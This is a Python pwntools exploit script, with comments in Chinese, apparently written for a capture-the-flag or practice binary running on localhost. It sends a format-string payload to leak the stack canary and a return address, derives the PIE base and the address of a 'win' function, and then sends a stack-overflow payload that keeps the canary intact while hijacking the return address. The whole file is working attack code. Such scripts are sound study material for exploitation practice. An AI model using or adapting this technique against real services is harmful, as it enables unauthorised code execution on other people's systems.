#!/usr/bin/env python3
from pwn import *
import re

HOST, PORT = '127.0.0.1', 13374
context.arch = 'amd64'

r = remote(HOST, PORT)

# 第一次 read: 格式化字符串泄露 canary 和 PIE
# buf 在 rbp-0x30, canary 在 rbp-0x08 = buf+0x28 = %11$
# ret addr 在 rbp+0x08 = buf+0x38 = %13$
r.send(b'%11$p|%13$p|')
data = r.recvuntil(b'|', timeout=5)   # banner\n0xCANARY|
data += r.recvuntil(b'|', timeout=5)  # 0xRET|

hex_vals = re.findall(r'0x[0-9a-f]+', data.decode(errors='replace'))
canary   = int(hex_vals[0], 16)
ret_leak = int(hex_vals[1], 16)

# ret_leak = PIE_base + 0x12bb (call vuln 的下一条指令)
pie_base = ret_leak - 0x12bb
win      = pie_base + 0x11e9
ret_g    = pie_base + 0x101a

log.info(f'canary:   {hex(canary)}')
log.info(f'pie_base: {hex(pie_base)}')
log.info(f'win:      {hex(win)}')

# 第二次 read: 栈溢出 + 绕过 canary + ret2win
payload  = b'A' * 0x28
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret_g)     # 16 字节栈对齐
payload += p64(win)

r.send(payload)
r.interactive()
